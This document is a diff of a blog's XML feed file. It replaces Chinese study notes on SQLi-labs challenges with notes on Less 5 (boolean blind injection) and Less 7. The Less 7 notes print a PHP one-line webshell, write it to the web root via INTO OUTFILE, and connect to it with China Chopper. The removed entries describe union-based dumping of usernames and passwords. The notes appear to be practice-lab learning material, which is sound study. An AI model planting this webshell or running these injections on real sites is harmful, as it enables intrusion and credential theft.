@@ -4,11 +4,11 @@
   
   
   <entry>
-    <title>less1~less4小总结</title>
-    <link href="/2021/11/14/less2/"/>
-    <url>/2021/11/14/less2/</url>
+    <title>less 7</title>
+    <link href="/2021/11/17/less%207/"/>
+    <url>/2021/11/17/less%207/</url>
     
-    <content type="html"><![CDATA[<ul><li>通过尝试使其报错，发现注入点</li><li>order by </li><li>union select 联合查询</li><li>查库列表字段</li><li>group_concat()和concat_ws(‘~’,id,password)镶嵌展示出答案</li></ul><h2 id="在sql盲注"><a href="#在sql盲注" class="headerlink" title="在sql盲注"></a>在sql盲注</h2><ul><li>select left（a，b）     //a的第b位</li><li>select a()regexp ‘b’    //a从左至右只要没有错（输入的b）就为正确，无论多少位</li><li>select  a()like ‘b%’      //同上</li><li>substr（a，b，c）      //b位置截取a字符串c个</li><li>ascii（）                     //转化为ascii值</li></ul>]]></content>
+    <content type="html"><![CDATA[<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><pre><code> &lt;?php @eval($_POST[pass]);?&gt;</code></pre><h2 id="select-‘something’-into-outfile-‘where’"><a href="#select-‘something’-into-outfile-‘where’" class="headerlink" title="select  ‘something’ into outfile ‘where’"></a>select  ‘something’ into outfile ‘where’</h2><pre><code>  将 something 写入where(where可以是文件也可以是指定的路径//使用双斜线来代替斜线)</code></pre><h2 id="select-load-file（"><a href="#select-load-file（" class="headerlink" title="select load_file（)"></a>select load_file（)</h2><pre><code>  读取本地文件</code></pre><h2 id="解题心得"><a href="#解题心得" class="headerlink" title="解题心得"></a>解题心得</h2><ul><li>首先还是试出？id=1’))–+</li><li>根据题目的提示知道使用outfile函数</li><li>再测出其有三列后，使用outfile函数将一句话病毒写入less7的目录下<br><img src="https://i.loli.net/2021/11/17/gWbGnc7kSF4ALxR.png" alt="屏幕截图 2021-11-17 160632.png"></li><li>将<a href="http://localhost/Less-7/1.php%E8%BE%93%E5%85%A5%E8%87%B3%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa">http://localhost/Less-7/1.php输入至中国菜刀，密码为a</a></li><li>成功</li></ul>]]></content>
     
     
     
@@ -17,11 +17,11 @@
   
   
   <entry>
-    <title>less 1</title>
-    <link href="/2021/11/02/1/"/>
-    <url>/2021/11/02/1/</url>
+    <title>less 5</title>
+    <link href="/2021/11/15/less%205/"/>
+    <url>/2021/11/15/less%205/</url>
     
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/8byP6pDQ5faxSj7.png" alt="屏幕截图 2021-11-02 195904.png"> </p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p> *库 表 列 字段<br>  查库：select schema_name from information_schema.schemata</p><p>  查表：select table_name from information_schema.tables where table_name=‘security’（建议使用16进制避免引入单引号）</p><p>  查列：select column_name from information_schema.columns where table_name=‘users’（建议使用16进制避免引入单引号）适用于所有单引号</p><ul><li><p>where定位（限制）</p></li><li><p>limit 0，1<br>  从第一个开始，显示一个</p></li><li><p>注释符：–+； –   ；#</p></li><li><p>可以利用一个恒真的句子（例如：or 1=1），使返回值恒真<br>思考：同样可以用一个恒假的句子来检测其正确</p></li></ul><p> 解题心得：<br>  order by x 使数据的第x列进行排序<br>  然后查出有三列<br>  使用语句 union select1，2，3– ；试出哪个数据可以回显<br>  执行后句子没有报错，但依旧和原来一样<br>  是因为id=1.输出了1的用户名以及password<br>  然后我们将1改为-1，使其报错<br>  然后显示如下<br><img src="https://i.loli.net/2021/11/13/IcfO1EwyeTNGX2b.png" alt="屏幕截图 2021-11-13 102744.png"><br> 说明第二列为用户名，第三列为password<br> 把3改schema_name from information_schema.schemata– 进行查库<br> group_concat(schema_name) from information_schema.schemata– </p><p> 后再进行查表查列</p><p> 将username和password取出可以使用concat_ws(“<del>“,username,password)<br> 使用grorp_conct(concat_ws(‘</del>‘,username,password)) 则可以取出全部，且方便阅读</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>出现情况：正确时返回一个结果，错误时不返回任何数值</p><p>解题过程:  * 直接使用order by判读出其有三列<br>                * 但无法直接使用联合查询<br>                * 使用了left函数<br><img src="https://i.loli.net/2021/11/15/5aNVF9Q2ZOcCxAn.png" alt="屏幕截图 2021-11-15 223616.png"></p>]]></content>
     
     
     
